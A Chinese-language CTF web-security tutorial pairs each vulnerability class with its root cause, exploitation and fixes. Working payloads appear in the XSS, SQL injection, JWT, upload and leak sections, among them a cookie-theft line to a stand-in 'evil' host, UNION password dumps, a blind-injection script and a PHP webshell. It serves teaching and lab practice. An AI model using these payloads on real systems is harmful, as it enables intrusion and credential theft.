> 这张图不是 payload 大全，而是「漏洞出生地」地图。左边是技术现场，右边是它最容易生出的漏洞；虚线表示两个漏洞可以接成一条链。点开一个节点，只看四件事：一句话是什么、诞生在哪、根因是什么、怎么观察。想深入，再按节点里的关键词去找博客、去靶场手动复现。

| 技术现场 | 节点 | 一句话 | 根因 | 对应节 |
| --- | --- | --- | --- | --- |
| 浏览器 / 前端 JS | **XSS 跨站脚本** | 用户输入被浏览器当成 HTML/JS 执行。 | 输出时没有按 HTML / 属性 / JS / URL 的上下文编码，数据越过了「文本」边界。 | p5l5 |
| HTTP / Cookie | **CSRF 跨站请求伪造** | 借浏览器自动携带的 Cookie，发一个用户没想发的请求。 | 身份凭据由浏览器自动附带，而操作本身没有绑定「本次请求」的额外凭证。 | p5l10 |
| 登录 / 鉴权 | **Session / JWT 绕过** | 身份凭据可预测、可伪造，或服务端根本没校验签名。 | 把「客户端提交的身份」当成可信身份；或密钥、算法、随机性不足。 | p5l15 |
| 业务流程 | **越权与逻辑漏洞** | 功能按设计跑，但「这个对象是不是你的」没校验。 | 把「参数里的对象归属」交给客户端决定，服务端只按 id 查询。 | p5l16 |
| 响应 / 错误 | **信息泄露** | 响应、备份、版本库把「不该给的地图」给了出去。 | 生产环境保留了开发/调试/历史产物；错误信息直接回显。 | p5l2 |
| 数据库 | **SQL 注入** | 用户输入变成了 SQL 语句的一部分。 | SQL 结构由字符串拼接决定，数据越过了「值」的边界。 | p5l3 |
| 数据库 | **NoSQL 注入** | 查询条件从字符串变成了对象，操作符被注入。 | 把用户提交的对象原样当查询条件，$ne / $regex 等操作符生效。 | p5l17 |
| 数据库 | **数据库 UDF 提权** | 数据库高权限账号把攻击者的共享库加载进进程，执行系统命令。 | 数据库账号权限过大，且允许从可写目录加载原生代码。 | p3d4 |
| 文件系统 | **文件上传** | 用户控制文件名/内容，文件又落在可执行目录。 | 上传校验信任客户端元数据；上传目录与 Web 根目录未隔离。 | p5l6 |
| 文件系统 | **路径穿越 / 文件包含** | 用户控制路径，读到任意文件，或把文件当代码包含。 | 路径由输入拼接，没有白名单或 realpath 边界校验。 | p5l7 |
| 文件系统 | **命令 / 代码执行** | 用户输入进入了 shell 或语言求值器。 | 数据被拼进命令/代码字符串，没有做到「参数与代码分离」。 | p5l8 |
| 模板引擎 | **SSTI 模板注入** | 用户输入被模板引擎当成模板源码求值。 | 把「模板源码」和「模板变量」混为一谈，用户能写表达式。 | p5l11 |
| XML / 解析器 | **XXE 外部实体** | XML 解析器把外部实体指向的文件/URL 读了进来。 | 解析器允许 DTD/外部实体，且解析结果会回显或被使用。 | p5l12 |
| 序列化 / 对象 | **PHP 反序列化** | 可控序列化字符串还原成对象，魔术方法被自动触发。 | 反序列化不可信数据，且类里有危险魔术方法/调用链。 | p5l13 |
| 序列化 / 对象 | **Python 反序列化** | pickle / PyYAML 等把字节还原成对象，可能触发任意调用。 | 反序列化不可信字节；Python 对象图可在还原时执行代码。 | p5l19 |
| 序列化 / 对象 | **Java 反序列化** | readObject 还原对象，第三方库的调用链被串起来。 | 反序列化不可信字节；classpath 里存在可利用的 gadget 链。 | p5l14 |
| Node.js 运行时 | **原型链污染** | __proto__ 被写进公共原型，之后所有对象都带上被污染的属性。 | 递归合并时没有过滤 __proto__/constructor/prototype，写穿了对象原型。 | p5l18 |
| 服务端请求 | **SSRF 服务端请求** | 服务器替你访问了你指定的、它本不该访问的地址。 | 服务端把用户给的 URL 直接交给 HTTP 客户端，没有出站白名单。 | p5l9 |

### 学习闭环：一个节点怎么学

1. 选一个节点，先读「一句话 / 根因 / 怎么观察」，**不要急着背 payload**。
2. 按节点给出的英文关键词，找 2 篇高质量文章（优先官方文档、PortSwigger、HackTricks）。
3. 在本地靶场手动复现：先证明「数据被当成了什么」，再谈具体 payload。
4. 写三行笔记：根因、修复点、换一个语言/框架是否还成立。
5. 回到图谱，把相关节点连起来看（如 上传 → 包含 → RCE），理解漏洞链而不是单点。

### 三个必须做到的标准

- **能画出数据流**：输入从哪来 → 经过什么处理 → 落到哪个危险函数。
- **能说出修复**：改哪一行、为什么能根治，而不是只加一个关键字过滤。
- **能换环境**：PHP 的 SQLi 换成 Flask + SQLite 还成立吗？成立的部分才是原理。
- **能连成链**：上传 → 包含 → RCE；SQLi → UDF → RCE；XSS → 读 Token → 绕过 CSRF。

> 💡 会打不等于会。payload 是结果，**根因**才是可迁移的东西。你如果能解释「为什么这一行会产生漏洞」，修复和变体都是自然推导出来的；反过来，只会背 payload，换个框架就归零。

## XSS：反射、存储、DOM

*约 45 分钟*

> 🎯 **本节目标**：分清三类 XSS 的触发路径，能根据 payload 落点选择正确写法。

XSS 的本质和 SQL 注入一模一样：**用户输入被当成 HTML/JS 代码，交给了浏览器执行。**区别在于执行的战场从数据库换成了浏览器——所以危害从「读数据」变成「以你的身份干任何事」。

**三类对比**

| 类型 | 数据路径 | 触发时机 | 典型场景 |
| --- | --- | --- | --- |
| 反射型 | 输入 → 服务器 → 立刻写回响应 → 浏览器执行 | 受害者点开构造好的链接 | 搜索结果页、错误提示回显参数 |
| 存储型 | 输入 → 数据库 → 别人访问页面时取出执行 | 任何人打开页面就中招 | 留言板、昵称、评论、工单 |
| DOM 型 | 输入 → 前端 JS 直接写进 DOM（不经过服务器） | 页面内 JS 处理 URL/hash 时 | document.write(location.hash)、innerHTML |

三者的区别决定了「怎么验证」：反射型和存储型会在服务器响应里看到 payload，DOM 型往往看不到——因为 payload 从头到尾都在浏览器里流转，服务器日志里只有一段正常的 URL。

### 先判断落点，再选 payload

**上下文 → payload**

| 落点位置 | payload 思路 | 示例 |
| --- | --- | --- |
| HTML 正文 | 直接插标签 | &lt;script&gt;alert(1)&lt;/script&gt;、&lt;img src=x onerror=alert(1)&gt; |
| 属性值里（双引号） | 先闭合属性再插事件 | " onmouseover="alert(1) |
| 属性值里（单引号） | 同上，换单引号 | ' onfocus='alert(1)' autofocus=' |
| &lt;script&gt; 内部字符串 | 闭合 script 标签 | &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; |
| href / src | 伪协议 | javascript:alert(1) |
| CSS / style 里 | expression / 类 CSS 注入 | 看浏览器版本，现代浏览器基本堵死 |
| JSON 回显 | 先看是否 text/html 渲染 | {"name":"&lt;img src=x onerror=alert(1)&gt;"} |

**存储型最小复现（留言板）**

```php
<?php
// 后端：把用户输入直接存库、直接输出
$msg = $_POST['msg'];
mysqli_query($conn, "INSERT INTO board(msg) VALUES('$msg')");

// 页面渲染
echo "<div class='msg'>" . $row['msg'] . "</div>";
// 输入 <img src=x onerror=alert(document.cookie)>
// 之后每个访问留言板的人都会执行它
?>
```

**DOM 型最小复现**

```js
// 页面里写了这样一段（很常见）
var name = location.hash.slice(1);
document.getElementById("hello").innerHTML = "你好，" + name;

// 访问：http://target/#<img src=x onerror=alert(1)>
// 服务器完全没参与，日志里只有一条正常请求
```

### 拿到 XSS 之后能干什么

- **偷 Cookie**：`new Image().src='http://evil/'+document.cookie`（HttpOnly 的 Cookie 读不到）。
- **发请求**：以受害者身份调用任意接口，绕开 CSRF Token（因为脚本就在同源页面里）。
- **改页面**：伪造登录框钓密码，或把转账按钮改成「领红包」。
- **读 DOM**：页面里渲染出来的敏感信息、前端存的 token，全都能读走。

### 修复：输出编码 + 纵深防御

**按上下文转义**

```php
<?php
// HTML 正文 / 属性：htmlspecialchars
echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8');

// JS 字符串里：json_encode 而不是手拼引号
echo "<script>var name = " . json_encode($msg) . ";</script>";

// URL 里：urlencode
echo "<a href='?q=" . urlencode($q) . "'>搜索</a>";
?>
```

> 💡 三道防线缺一不可：**输出时按上下文编码**（根治）、**HttpOnly**（Cookie 偷不走）、**CSP**（就算漏了也执行不了内联脚本）。前端框架的 `innerHTML`、`dangerouslySetInnerHTML`、`v-html` 都是新雷区。

## CSRF：借你的手发请求

*约 30 分钟*

> 🎯 **本节目标**：理解「浏览器自动带 Cookie」为什么能变成攻击，以及 Token / SameSite / Origin 各自防住了什么。

CSRF（跨站请求伪造）不偷你的 Cookie，也不读你的数据。它只做一件事：**让浏览器带着你的 Cookie，去发一个你没想发的请求。**因为 Cookie 是「按域名自动附带的」，浏览器不会问「这是不是你自己点的」。

**最小 PoC（攻击者页面）**

```html
<!-- 受害者登录了 bank.com 后，访问攻击者页面即触发 -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="hacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('f').submit()</script>

<!-- 页面看起来什么都没发生，请求已经带着受害者的 Cookie 发出去了 -->
```

**成立条件与防护手段**

| 条件 / 手段 | 说明 |
| --- | --- |
| 前提 1 | 目标用 Cookie 维持身份（Session/Cookie 认证） |
| 前提 2 | 敏感操作只校验「有没有登录」，没有额外凭证 |
| CSRF Token | 每个表单带一次性随机令牌，攻击者跨站拿不到它 |
| SameSite Cookie | Lax：跨站 POST 不带 Cookie；Strict：跨站一律不带 |
| 校验 Origin/Referer | 请求来源不是自己站点就拒绝 |
| 二次验证 | 转账/改密要求再输密码或验证码（最稳） |

### 为什么 CSRF Token 能防住

同源策略让攻击者的页面**读不到**目标站点的页面内容——包括页面里的 Token。所以攻击者能「让浏览器发请求」，但发不出「带正确 Token 的请求」。这就是 CSRF 防护的核心逻辑：**把「身份」和「本次操作」绑在一起。**

**后端怎么校验 Token**

```php
<?php
session_start();
// 生成：只有本站页面能拿到这个值
$token = bin2hex(random_bytes(16));
$_SESSION['csrf'] = $token;
// 页面：<input type="hidden" name="csrf" value="<?= $token ?>">

// 校验：POST 上来的 token 必须和 session 里的一致
if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
    die("CSRF token 校验失败");
}
?>
```

**常见变体**

```html
GET 型：<img src="https://bank.com/transfer?to=hacker&amount=10000">
  -> 说明敏感操作绝不能用 GET

JSON 型：需要用表单发 application/json 通常不行，
  但目标若接收 text/plain 或 x-www-form-urlencoded 的 JSON，就能打

配合 XSS：XSS 能读页面里的 Token，CSRF 防护直接失效
  -> 所以 XSS 比 CSRF 危险得多
```

> 💡 CTF 里 CSRF 题常考「让你构造一个 PoC 页面并提交给 bot 访问」。要点：**表单自动提交、目标站点的 Cookie 要被带上、别用 fetch（会被 CORS 拦）**。

## 认证绕过：Session / JWT / Cookie

*约 35 分钟*

> 🎯 **本节目标**：掌握三类「冒充身份」的常用手法，并能用工具验证。

认证绕过是 CTF 里性价比最高的一类：不用拿 shell，改一个字段就能进后台。

**JWT 的四类攻击**

```
1. alg 改成 none，删掉签名段
   {"alg":"none"} . payload . （空签名）
   -> 服务器若没显式拒绝 none，直接通过

2. 弱密钥爆破
   用 jwt_tool / hashcat，字典来自常见弱口令

3. 算法混淆（RS256 -> HS256）
   前提：服务器用公钥验证，但代码里把公钥当 HS256 的密钥用
   -> 用公钥当 HMAC 密钥重新签名

4. kid 注入
   kid 指向可控文件（../dev/null）或直接拼进 SQL
   -> 用空密钥 / 用已知文件内容当密钥
```

**jwt_tool 常用命令**

```bash
python3 jwt_tool.py <JWT> -M at            # 自动跑各种攻击
python3 jwt_tool.py <JWT> -C -d wordlist.txt # 爆破 HS256 密钥
python3 jwt_tool.py <JWT> -X a             # alg=none
python3 jwt_tool.py <JWT> -X k -pk public.pem  # 算法混淆
```

**Session / Cookie 攻击面**

| 手法 | 说明 |
| --- | --- |
| session id 可预测 | 时间戳、自增值、MD5(用户名) 之类 |
| 伪造 Cookie 里的权限字段 | role=admin、is_admin=1，后端直接信任 |
| Session Fixation | 让受害者用攻击者已知的 session id 登录 |
| Cookie 里是序列化数据 | PHP/Java 反序列化入口 |
| JWT 放在 localStorage | XSS 可直接读走 |

### 判断顺序（按成本从低到高）

1. 先看 token 结构：JWT 就 base64 解开 header/payload，看 role 之类的字段。
2. 改 payload 里的权限字段，看签名是否被校验（不校验直接过 = 最简单）。
3. 查 alg 是否接受 none，用 jwt_tool -X a 试。
4. 用常见弱口令爆破 HS256 密钥。
5. 看 kid/x5u/jku 等字段是否可控。
6. 以上都不行，再考虑 session 伪造或反序列化。

**JWT 结构（自己拆一遍）**

```python
import base64, json
tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJ1c2VyIn0.xxxxx"
h, p, s = tok.split(".")
pad = lambda x: x + "=" * (-len(x) % 4)
print(json.loads(base64.urlsafe_b64decode(pad(h))))
print(json.loads(base64.urlsafe_b64decode(pad(p))))
# 输出：{'alg': 'HS256', 'typ': 'JWT'}  {'uid': 1, 'role': 'user'}
# 注意：payload 是"明文"，只是 base64，不是加密
```

> 💡 记住一个底层事实：**JWT 的安全性 100% 依赖签名校验**。payload 谁都能看、谁都能改。所有攻击最终都是「让服务器接受一个我没签过的 payload」。

## 逻辑漏洞与越权

*约 30 分钟*

> 🎯 **本节目标**：理解「代码没写错，但业务逻辑被绕过」，建立挖逻辑漏洞的固定流程。

逻辑漏洞没有「注入点」这种明确标志，它的定义是：**功能按设计跑起来了，但某个假设被攻击者破坏了**——比如「用户只会改自己的 id」「金额只能是正数」「支付必须先付款」。

**常见类型**

| 类型 | 具体表现 | 怎么试 |
| --- | --- | --- |
| 水平越权 | 改 id 看别人的订单/资料 | 把用户 id 改成相邻值 |
| 垂直越权 | 普通用户直接调管理员接口 | 抓管理员的请求，换成普通账号重放 |
| 价格篡改 | 改单价、数量为负、优惠券叠加 | 改请求体里的金额字段 |
| 支付绕过 | 跳过支付步骤、改金额、重放 | 删掉中间步骤直接请求最后一步 |
| 验证码问题 | 复用、爆破、短信轰炸、前端校验 | 同一验证码用两次；写成 0000–9999 爆破 |
| 流程竞争 | 同一优惠券并发使用多次 | 多线程同时发请求 |

### 挖逻辑漏洞的四步

1. 正常走一遍完整流程，用 Burp 记下**每一个**请求（注册、登录、下单、支付、退款）。
2. 逐个问：这一步的「前提」是服务器保证的，还是前端/上一步保证的？
3. 改掉你觉得「不该被改」的参数：id、数量、金额、状态、时间、角色。
4. 重复、并发、乱序地发请求——很多漏洞只在「同时发生」时出现。

**一个典型的越权**

```
# 正常：GET /api/order?id=1001      （当前用户自己的订单）
# 越权：GET /api/order?id=1002      （别人的订单，服务器没校验归属）

# 修复：从 session 里取用户 id，而不是从请求里取
# 错误：SELECT * FROM orders WHERE id = $_GET['id']
# 正确：SELECT * FROM orders WHERE id = ? AND user_id = ?
```

**并发竞争的最小验证**

```bash
# 用同一张优惠券同时发 20 个请求，看是否都被接受
seq 20 | xargs -P 20 -I{} curl -s -b "session=..." \
  -X POST https://target/api/coupon/use -d "code=XXXX" -o /dev/null -w "%{http_code}\n"

# 原理：后端顺序是「查是否已用 -> 用掉 -> 更新状态」
# 并发时多个请求在「查」之后、更新之前都通过了检查
```

> 💡 逻辑漏洞无法靠字典扫，全靠对业务流程的理解。**这类题最考耐心和观察力，也最接近真实的渗透测试**——因为它是真正「读懂系统」的体现。

## 信息泄露

*约 30 分钟*

> 🎯 **本节目标**：系统化检查一个站「不该给的东西」，并会把泄露变成下一步的入口。

信息泄露本身往往不是最终目的，而是**解题的钥匙**：拿到源码就知道漏洞在哪，拿到备份就知道数据库结构，拿到 .git 就拿到了整个历史版本。CTF 里 90% 的「这题好难」其实是「我还没找到泄露点」。

**常见泄露点清单**

| 位置 | 典型对象 | 拿到之后能干什么 |
| --- | --- | --- |
| 前端 | HTML 注释、隐藏 input、内联 JS 常量、source map | 直接读 flag / 找到隐藏接口 |
| 源码备份 | www.zip、web.zip、index.php.bak、.index.php.swp | 审计出真正的漏洞点 |
| 版本库 | .git/、.svn/、.hg/ | 还原全部历史源码 |
| 配置 | .env、config.php、composer.json、package.json | 数据库账号、密钥、依赖版本 |
| 调试 | /debug、/console、actuator/env、phpinfo.php、错误堆栈 | 环境变量、路径、内存信息 |
| 目录 | robots.txt、/admin/、/backup/、目录列表 | 发现后台与备份 |
| 指纹 | X-Powered-By、Server、静态资源 hash、Cookie 名 | 判断框架与版本，选对应的利用链 |

### 动手：五分钟基线检查

1. 看响应头：`curl -I`，记下 Server / X-Powered-By / Set-Cookie，判断语言与框架。
2. 看 robots.txt 与 sitemap.xml：管理员路径、备份目录经常就写在这里。
3. 看页面源码：Ctrl+F 搜 `flag`、`api`、`key`、`token`、`password`。
4. 猜备份文件：常见命名 `www.zip`、`web.zip`、`backup.zip`、`index.php.bak`、`.index.php.swp`，用 dirsearch 批量跑。
5. 试版本库：`/.git/config` 返回 200 就是泄露，用 GitHack / git-dumper 拉全量。
6. 看错误：故意传一个非法参数触发报错，报错里常带绝对路径、框架版本、SQL 语句。

**最常用的几个探测**

```bash
curl -I https://target/                     # 响应头指纹
curl https://target/robots.txt
curl https://target/.git/config              # 200 = Git 泄露
curl https://target/www.zip -o a.zip -s -w "%{http_code}\n"
curl https://target/index.php.bak -s -w "%{http_code}\n"

# 目录扫描（合法靶场上用）
dirsearch -u https://target/ -e php,bak,zip,txt,swp
```

**Git 泄露的利用**

```bash
# 方案一：GitHack（Python2，按目录还原）
python GitHack.py http://target/.git/

# 方案二：git-dumper（更稳，推荐）
git-dumper http://target/.git/ ./src_leak

# 还原之后看历史记录，flag 常在已经"删掉"的提交里
cd src_leak && git log --all --oneline && git show <commit>
```

### source map 为什么危险

打包工具会把多个源文件压缩成一个 `app.min.js`，同时生成 `app.min.js.map` 记录「每个字符来自哪个源文件」。这个 .map 一旦留在线上，压缩代码就等于源码全公开——变量名、注释、甚至你没打算发布的调试逻辑都回来了。F12 → Sources 里能看到原文件列表，就是这个 .map 生效了。

### 修复

- 上线前删除 `.git`、`.svn`、`.DS_Store`、备份文件、编辑器的 swap 文件。
- 生产环境关闭详细报错（PHP: `display_errors=Off`），错误写日志而不是打印给用户。
- source map 不要随静态资源一起发布，或放在访问不到的位置。
- 敏感配置（数据库密码、密钥）只放在服务端环境变量里，永不进前端。
- 给 `/admin`、`/backup` 这类目录加访问控制，别指望「没人知道这个路径」。

> 💡 信息收集要有边界：以上探测只在**自己搭的靶场**或**明确授权**的目标上做。对真实站点做目录扫描，在大多数国家和地区都需要书面授权。

- [CTFHub · 信息泄露专项（Git/备份/目录）](https://www.ctfhub.com/)
- [dirsearch（目录扫描）](https://github.com/maurosoria/dirsearch)

## SQL 注入（上）：原理与联合查询

*约 40 分钟*

> 🎯 **本节目标**：理解拼接为什么危险，会判断字段数、找显位、用 UNION 把数据取出来。

SQL 注入的本质只有一句话：**用户输入变成了 SQL 语句的一部分，而不是一个值。**下面这段代码在 PHP 里极其常见：「把 id 拼进查询字符串」。

**漏洞是怎么产生的**

```php
<?php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";   // 直接拼接
$row = mysqli_query($conn, $sql);

// 正常请求：?id=1
//   SELECT * FROM users WHERE id = 1

// 攻击请求：?id=1 OR 1=1
//   SELECT * FROM users WHERE id = 1 OR 1=1      -> 全表返回
?>
```

注意这个变化：**1** 是一个值，**1 OR 1=1** 是三个值加一个条件。拼接之后，数据库看到的已经不是「一个数字」，而是一段带逻辑的语句。这就是注入成立的根。

### 判断注入：四步都做完再下结论

1. **加引号看报错**：`?id=1'` 出现 SQL 语法报错 → 大概率是字符型注入。
2. **比较真假**：`?id=1 and 1=1` 与 `?id=1 and 1=2` 的响应内容/长度不同 → 注入成立。
3. **判断类型**：数字型（`id=1`）、字符型（`id='1'`）、搜索型（`like '%1%'`）；字符型要闭合引号。
4. **判断字段数**：`order by 1` 到 `order by N`，直到报错，N-1 就是字段数。

**标准利用步骤（MySQL）**

```sql
?id=1 order by 3 --            字段数 = 3
?id=-1 union select 1,2,3 --    找显位（-1 让前一条空，页面才会显示 union 的结果）
?id=-1 union select 1,database(),3 --
?id=-1 union select 1,user(),3 --
?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --
?id=-1 union select 1,group_concat(username,0x3a,password),3 from users --
```

**每一步在问什么**

| 目的 | payload 关键部分 | 为什么这样写 |
| --- | --- | --- |
| 判断字段数 | order by N | 按第 N 列排序，列不存在就报错 |
| 让原查询为空 | id=-1 | 否则原记录占满页面，union 的结果显示不出来 |
| 找显位 | union select 1,2,3 | 看页面哪个位置回显了数字，那个位置就是输出点 |
| 看库名版本 | database() / version() | 先确认权限与环境 |
| 看表名 | information_schema.tables | MySQL 自带的元数据表，存着所有表和列 |
| 看列名 | information_schema.columns | 同上，定位目标表结构 |
| 取值 | group_concat(a,0x3a,b) | 0x3a 是冒号，把用户名和密码拼成一行 |

### 为什么「过滤关键字」不是修复

如果只把 `select`、`union` 替换成空，攻击者用 `SeLeCt`、`sel/**/ect`、`/*!50000select*/` 就能绕过。根本原因是**SQL 语句本身参与了字符串拼接**，只要结构还能被输入改变，绕过只是成本问题。

**正确修复：参数化查询**

```php
<?php
// PDO 预处理：SQL 结构先定死，参数后传进去
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
$row = $stmt->fetch();

// mysqli 预处理
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);      // i = 整数，类型强转
$stmt->execute();
?>
```

> 💡 参数化查询的关键不是「过滤了危险字符」，而是**数据库永远只把参数当值，不当语法**。同样的原理也适用于所有 ORM：用占位符，不要用字符串拼 SQL。

## SQL 注入（下）：盲注、报错、绕过

*约 45 分钟*

> 🎯 **本节目标**：页面不回显时，仍能通过布尔、时间、报错三条路把数据一点点取出来，并知道什么时候必须写脚本。

真实题目里，注入点常常「不回显」：页面只有「用户存在 / 不存在」两个状态，或者干脆只给一个正常页面。这时要把数据库当成一个**只能回答是/否的黑盒**，用问题一位一位地把数据问出来。

**布尔盲注：看真假**

```sql
?id=1 and length(database())=4 --           库名长度是不是 4
?id=1 and substr(database(),1,1)='a' --      第 1 个字符是不是 a
?id=1 and ascii(substr(database(),1,1))>97 -- 用 ASCII 区间做二分，快得多
```

**时间盲注：看延时**

```sql
?id=1 and if(length(database())=4,sleep(3),0) --
?id=1 and if(ascii(substr(database(),1,1))>97,sleep(3),0) --

# 其他数据库
SQL Server: ;waitfor delay '0:0:3' --
PostgreSQL: ;select pg_sleep(3) --
```

**报错注入：看报错回显**

```sql
# MySQL（5.1–5.7 常见，需报错信息回显）
?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1) --
?id=1 and extractvalue(1,concat(0x7e,(select database()))) --

# 原理：把查询结果拼进报错信息里，报错被回显到页面
# 0x7e 是 ~，用来分隔数据方便提取
```

**三条路怎么选**

| 手法 | 依赖条件 | 速度 | 什么时候用 |
| --- | --- | --- | --- |
| 联合查询 | 有回显、字段数已知 | 最快 | 页面会把查询结果打印出来 |
| 报错注入 | 报错信息回显到页面 | 快 | 有回显但只有报错，或 union 被拦 |
| 布尔盲注 | 页面有「真/假」两种可区分的状态 | 中 | 无回显，但响应有差异（长度/内容/状态码） |
| 时间盲注 | 什么都看不出来，只能靠响应时间 | 最慢 | 以上全不行，最后的办法 |

**布尔盲注脚本骨架**

```python
import requests, string

url = "http://target/?id=1"
chars = string.ascii_lowercase + string.digits + "_{}-"
result = ""

for pos in range(1, 40):
    for ch in chars:
        payload = f"1' and substr(database(),{pos},1)='{ch}' -- "
        r = requests.get(url, params={"id": payload})
        if "存在" in r.text:          # 用页面上的"真"信号判断
            result += ch
            print(pos, ch, result)
            break
    else:
        break

print("命中:", result)
```

> 💡 盲注必须脚本化。手工逐位猜 20 个字符要几百次请求，写脚本 20 行就搞定——这正是 PART 4 讲 Python 的原因。二分法（先判断 ASCII 范围再缩小）比逐字符遍历快 5 倍以上。

### WAF 绕过的常见手法

**绕过对照表**

| 被拦的东西 | 绕过写法 | 说明 |
| --- | --- | --- |
| 大小写 | SeLeCt / UnIoN | 很多正则不忽略大小写 |
| 空格 | sel/**/ect、%09、%0a、+ | 注释和空白符都能当分隔 |
| 关键字 | sel/**/ect、双写 selselectect | 替换时只替换一次就能绕过 |
| 内联注释 | /*!50000select*/ | MySQL 特有，注释里的内容会被执行 |
| 引号 | 0x61646d696e（十六进制） | 避免出现引号被过滤 |
| and/or | && / \|\| / xor | 运算符等价替换 |
| 等号 | like、regexp、in、between | 同样的语义换函数 |

**sqlmap 的定位：省力的工具，不是替代理解**

```bash
# 先手工确认注入点和参数，再用工具放大
sqlmap -u "http://target/?id=1" --batch --dbs
sqlmap -u "http://target/?id=1" -D dbname --tables
sqlmap -u "http://target/?id=1" -D dbname -T users --dump

# 请求有 Cookie / 头时，用请求文件更省事
sqlmap -r req.txt -p id --batch --level 3 --risk 2
```

> 💡 比赛里 sqlmap 常常被 WAF 拦。真正稳定的路线是：**先判断注入类型 → 先试 union / 报错 → 不行再写盲注脚本**。工具帮你省时间，但不能帮你绕过你没理解的东西。

## NoSQL 注入

*约 25 分钟*

> 🎯 **本节目标**：理解 MongoDB 查询对象的注入方式，以及和 SQL 注入的共同点。

NoSQL 数据库（MongoDB 最常见）用「对象」来描述查询条件。如果后端把用户输入直接拼进查询对象，攻击者就能构造出「匹配任意值」的条件——这和 SQL 注入同源，只是注入的载体从字符串换成了对象。

**MongoDB 注入原理**

```js
// 正常查询
db.users.find({ username: name, password: pw })

// 攻击：让 password 变成「不等于 1」的查询对象
// 请求：?username=admin&password[$ne]=1
// 后端解析成 { username: 'admin', password: { $ne: 1 } }
// -> 只要密码不等于 1 就匹配，等于绕过密码校验

// 其他常用操作符
?username[$regex]=^adm&password[$ne]=1
?username[$gt]=&password[$gt]=
```

**常用操作符与含义**

| 操作符 | 含义 | 注入用法 |
| --- | --- | --- |
| $ne | 不等于 | $ne=1 让密码校验永远为真 |
| $gt / $lt | 大于 / 小于 | $gt= 空串匹配任何存在的值 |
| $regex | 正则匹配 | 逐字符猜用户名/密码 |
| $exists | 字段存在 | 探测字段 |
| $where | JS 表达式（旧版） | 直接执行 JS，危害最大 |

**后端漏洞代码与修复**

```js
// 危险：直接把 req.body 当年的查询条件
app.post('/login', (req, res) => {
  db.collection('users').findOne({ username: req.body.username, password: req.body.password })
    .then(u => res.send(u ? 'ok' : 'fail'));
});

// 修复 1：强制把参数转成字符串
const username = String(req.body.username);
// 修复 2：用 express-mongo-sanitize 去掉 $ 开头的键
// 修复 3：密码比对在应用层做（hash 比对），不要拼进查询条件
```

> 💡 CTF 里 NoSQL 注入的入口通常是登录框；用 `[$ne]=1` 或 `[$regex]` 试一下就知道。判据和 SQL 盲注一样：**看响应差异**。

## 文件上传

*约 40 分钟*

> 🎯 **本节目标**：掌握五类上传校验的绕过方式，理解「能传上去」和「能执行」的区别。

文件上传漏洞的价值不在「传上去了」，而在「**传上去的文件能被服务器当代码执行**」。所以每道上传题的核心问题永远是：服务器会不会执行我传的这个文件？

**五道关，逐一突破**

| 检查点 | 它怎么拦 | 怎么绕 |
| --- | --- | --- |
| 前端 JS 校验 | onchange 检查后缀 | 直接改包（Burp / curl），或删掉页面上的 JS |
| Content-Type | 要求 image/png | 改请求里的 Content-Type，不影响真实内容 |
| 后缀黑名单 | 禁止 .php | .php3 .phtml .pht .phps .pHp；Windows 的 .php. 与 .php::$DATA |
| 后缀白名单 | 只允许 .jpg | 解析漏洞：Apache 多后缀 a.php.jpg、Nginx 配置错误、/1.php/. 路径穿越 |
| 内容/文件头检测 | 检查 magic bytes | 图片马（GIF89a + PHP 代码）+ 文件包含；或二次渲染绕过 |

**典型的不安全上传后端**

```php
<?php
// 只检查了后缀黑名单
$name = $_FILES['file']['name'];
$ext  = strtolower(substr($name, strrpos($name, '.')));
$blocked = ['php', 'php5', 'php7'];

if (!in_array($ext, $blocked)) {
    move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $name);
    echo "上传成功：" . $name;
} else {
    echo "不允许的类型";
}
?>
```

### 绕过流程

1. 先传一个正常的 jpg 确认功能可用，记住返回的访问路径。
2. 改成 `shell.php` 传，看拦截信息 —— 是前端弹窗（改包就能过）还是后端报错（要换后缀）。
3. 换后缀：`.phtml`、`.php3`、`.phps`、`.pht`，逐个试到能上传。
4. 还不行就试 `shell.php.jpg`（解析漏洞）、`shell.php%00.jpg`（老版本截断）、`shell.php.`（Windows 去点）。
5. 传上去之后，访问返回的路径，看是否被解析执行。**不能执行就只是存了个文件，不算 getshell。**

**图片马 + 文件包含**

```bash
# 把 PHP 代码藏在图片里，图片本身仍然能正常显示
copy normal.gif shell.php
echo "<?php @eval($_POST['c']); ?>" >> shell.php

# 单靠图片马不够，还要有文件包含把这个"图片"当 PHP 执行
# ?page=uploads/shell.gif
# 或者 .htaccess / .user.ini 让 .gif 被当 PHP 解析
```

**.htaccess 与 .user.ini**

```
# .htaccess（Apache）：让所有 .jpg 按 PHP 解析
AddType application/x-httpd-php .jpg

# .user.ini（PHP-FPM）：在每个请求前自动包含你的文件
auto_prepend_file=shell.jpg

# 条件竞争：先上传到临时目录再检查/删除
# 趁检查前的窗口期，用多线程疯狂访问，抢在被删之前执行
```

### 修复

- **白名单后缀**，白名单要包含解析顺序（只留 .jpg/.png/.gif）。
- **重命名**：用随机文件名 + 固定后缀，别用用户给的名字。
- **上传目录禁止执行**：Nginx 里 `location ~ \.(php)$ { deny all; }`，Apache 用 `php_flag engine off`。
- **校验内容**：magic bytes + 图片二次渲染；但内容校验也不是万能，最好配合「不执行」。
- **存储分离**：文件放对象存储/CDN，Web 服务根目录根本访问不到。

> 💡 上传题最省时间的做法：**先用 Burp 抓到上传请求，之后所有测试都在 Repeater 里改包重放**，不要在浏览器里反复点。改后缀、改 Content-Type、改文件名都是同一件事：改一个字段，发一次。

## 路径穿越与文件包含

*约 35 分钟*

> 🎯 **本节目标**：理解「用户控制路径」的两种危害：读任意文件、执行任意代码。

